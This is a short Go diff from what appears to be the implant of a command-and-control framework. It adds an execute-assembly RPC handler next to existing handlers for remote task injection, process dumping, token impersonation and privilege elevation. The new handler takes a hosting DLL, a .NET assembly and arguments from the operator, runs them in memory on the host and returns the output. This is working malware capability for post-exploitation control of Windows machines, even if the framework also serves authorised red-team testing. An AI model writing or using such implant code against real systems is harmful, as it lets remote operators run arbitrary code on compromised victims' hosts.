@@ -15,11 +15,12 @@ import (
 var (
 	windowsHandlers = map[uint32]RPCHandler{
 		// Windows Only
-		pb.MsgTask:           taskHandler,
-		pb.MsgRemoteTask:     remoteTaskHandler,
-		pb.MsgProcessDumpReq: dumpHandler,
-		pb.MsgImpersonateReq: impersonateHandler,
-		pb.MsgElevateReq:     elevateHandler,
+		pb.MsgTask:               taskHandler,
+		pb.MsgRemoteTask:         remoteTaskHandler,
+		pb.MsgProcessDumpReq:     dumpHandler,
+		pb.MsgImpersonateReq:     impersonateHandler,
+		pb.MsgElevateReq:         elevateHandler,
+		pb.MsgExecuteAssemblyReq: executeAssemblyHandler,
 
 		// Generic
 		pb.MsgPsListReq:   psHandler,
@@ -108,4 +109,27 @@ func elevateHandler(data []byte, resp RPCResponse) {
 	}
 	data, err = proto.Marshal(elevate)
 	resp(data, err)
+}
+
+func executeAssemblyHandler(data []byte, resp RPCResponse) {
+	execReq := &pb.ExecuteAssemblyReq{}
+	err := proto.Unmarshal(data, execReq)
+	if err != nil {
+		// {{if .Debug}}
+		log.Printf("error decoding message: %v", err)
+		// {{end}}
+		return
+	}
+	output, err := taskrunner.ExecuteAssembly(execReq.HostingDll, execReq.Assembly, execReq.Arguments, execReq.Timeout)
+	strErr := ""
+	if err != nil {
+		strErr = err.Error()
+	}
+	execResp := &pb.ExecuteAssembly{
+		Output: output,
+		Error:  strErr,
+	}
+	data, err = proto.Marshal(execResp)
+	resp(data, err)
+
 }
